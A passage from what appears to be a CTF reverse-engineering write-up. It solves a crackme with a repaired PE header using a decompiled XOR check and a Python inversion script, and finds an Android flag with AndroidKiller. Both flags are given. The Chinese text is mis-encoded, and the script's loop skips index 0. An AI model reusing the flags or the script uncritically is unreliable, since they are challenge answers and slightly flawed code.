</span></code></pre><h3 id=week-1-ezpe>[Week 1]EzPE<a aria-label="Anchor link for: week-1-ezpe" class=zola-anchor href=#week-1-ezpe style=visibility:hidden></a></h3><p>ä¸‹è½½é™„ä»¶åç”¨æŸ¥å£³å·¥å…·æŸ¥å‘ç°æ— æ³•æŸ¥å‡ºæ¥ï¼Œç”¨ 010 æ‰“å¼€å’Œå…¶ä»– exe æ–‡ä»¶å¯¹æ¯”å‘ç°ç¼ºå¤±äº†æ–‡ä»¶å¤´éƒ¨åˆ†ï¼Œéœ€å°†æ–‡ä»¶å¤´éƒ¨åˆ†è¿›è¡Œä¿®å¤ã€‚<p><img src="https://writeup.owo.show/~gitbook/image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FMEPGebOjUqq8l8DrWOab%252FEzPE-1.png%3Falt%3Dmedia%26token%3D61a87172-da22-4f40-b6a3-8e554f54118d&width=768&dpr=4&quality=100&sign=77123c2bab2b6b0abfaa19527042e71919efd1de307ccc5a32f152ec991ad61b" alt=img><p>ç”¨ ida64 æ‰“å¼€ï¼Œé€šè¿‡åç¼–è¯‘å¯ä»¥å¾—åˆ°ä»¥ä¸‹å†…å®¹<pre class=z-code><code><span class="z-text z-plain">int __cdecl main(int argc, const char **argv, const char **envp)
</span><span class="z-text z-plain">{
</span><span class="z-text z-plain">  int i; // [rsp+2Ch] [rbp-4h]
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">  _main(argc, argv, envp);
</span><span class="z-text z-plain">  puts(&draw);
</span><span class="z-text z-plain">  puts("Please enter your flag!\n");
</span><span class="z-text z-plain">  scanf("%s", input);
</span><span class="z-text z-plain">  for ( i = 0; i < strlen(input) - 1; ++i )
</span><span class="z-text z-plain">    input[i] ^= i ^ input[i + 1];
</span><span class="z-text z-plain">  if ( !strcmp(input, data) )
</span><span class="z-text z-plain">    puts("You Win!");
</span><span class="z-text z-plain">  else
</span><span class="z-text z-plain">    puts("You lose!");
</span><span class="z-text z-plain">  system("pause");
</span><span class="z-text z-plain">  return 0;
</span><span class="z-text z-plain">}
</span></code></pre><p>å¹¶ä¸” data æ•°ç»„å†…å®¹å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">array_data = [
</span><span class="z-text z-plain">  0x0A, 0x0C, 0x04, 0x1F, 0x26, 0x6C, 0x43, 0x2D, 0x3C, 0x0C,
</span><span class="z-text z-plain">  0x54, 0x4C, 0x24, 0x25, 0x11, 0x06, 0x05, 0x3A, 0x7C, 0x51,
</span><span class="z-text z-plain">  0x38, 0x1A, 0x03, 0x0D, 0x01, 0x36, 0x1F, 0x12, 0x26, 0x04,
</span><span class="z-text z-plain">  0x68, 0x5D, 0x3F, 0x2D, 0x37, 0x2A, 0x7D
</span><span class="z-text z-plain">]
</span></code></pre><p>é€šè¿‡åˆ†æå¯å¾—å¯†æ–‡ç”±å°†æ˜æ–‡çš„æ¯ä¸ªå­—ç¬¦ä¸å…¶ä¸‹ä¸€ä¸ªå­—ç¬¦ä»¥åŠå½“å‰ index å€¼è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå¹¶å°†ç»“æœèµ‹å€¼ç»™å½“å‰å­—ç¬¦ï¼Œå› æ­¤è¦é€†å‘å›æ¥åªéœ€è¦å€’è½¬åè¿‡æ¥å³å¯ï¼Œè„šæœ¬å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">array_data = [
</span><span class="z-text z-plain">  0x0A, 0x0C, 0x04, 0x1F, 0x26, 0x6C, 0x43, 0x2D, 0x3C, 0x0C,
</span><span class="z-text z-plain">  0x54, 0x4C, 0x24, 0x25, 0x11, 0x06, 0x05, 0x3A, 0x7C, 0x51,
</span><span class="z-text z-plain">  0x38, 0x1A, 0x03, 0x0D, 0x01, 0x36, 0x1F, 0x12, 0x26, 0x04,
</span><span class="z-text z-plain">  0x68, 0x5D, 0x3F, 0x2D, 0x37, 0x2A, 0x7D
</span><span class="z-text z-plain">]
</span><span class="z-text z-plain">print(len(array_data))
</span><span class="z-text z-plain">for i in range(len(array_data) - 2, 0, -1):
</span><span class="z-text z-plain">    array_data[i] ^= i ^ array_data[i + 1]
</span><span class="z-text z-plain">print(''.join(chr(data) for data in array_data))
</span><span class="z-text z-plain">
</span><span class="z-text z-plain"># flag{Y0u_kn0w_what_1s_PE_File_F0rmat}
</span></code></pre><h3 id=week-1-lazy-activtiy>[Week 1]lazy_activtiy<a aria-label="Anchor link for: week-1-lazy-activtiy" class=zola-anchor href=#week-1-lazy-activtiy style=visibility:hidden></a></h3><blockquote><p>https://github.com/liaojack8/AndroidKiller</blockquote><p>ä½¿ç”¨ AndroidKiller æ‰“å¼€åæœç´¢ flag å³å¯å¾—åˆ° flagã€‚<p><img src="https://writeup.owo.show/~gitbook/image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FZl7WLJOue4Uv9zlfSF1T%252Flazy_activtiy-1.png%3Falt%3Dmedia%26token%3D36498bef-15b7-4f75-a37b-1e899525c9b5&width=768&dpr=4&quality=100&sign=7a8856c106556e0aeea2da78dd92d611d36371a3bf0417237ca6d33703e40e46" alt=img><pre class=z-code><code><span class="z-text z-plain">flag{Act1v1ty_!s_so00oo0o_Impor#an#}
</span></code></pre><h3><a aria-label="Anchor link for: " class=zola-anchor href=# style=visibility:hidden></a></h3></article><div class="reaction right" data-endpoint="https://reaction.woaikanpika123.workers.dev "></div><div class=giscus></div><script async crossorigin data-category=General data-category-id=DIC_kwDONtXUfc4CrRaB data-emit-metadata=0 data-input-position=bottom data-lang=en data-mapping=pathname data-reactions-enabled=1 data-repo=lbsucceed/lbsucceed.github.io data-repo-id=R_kgDONtXUfQ data-strict=0 data-theme=noborder_light src=https://giscus.app/client.js></script></div><footer><div class=copyright><p>Â© 2025 lbsucceed</div></footer></main></div><script src=/js/lightense.min.js></script><script type=module>import a from"https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs";a.initialize({startOnLoad:!0})</script><script src=/js/main.js></script>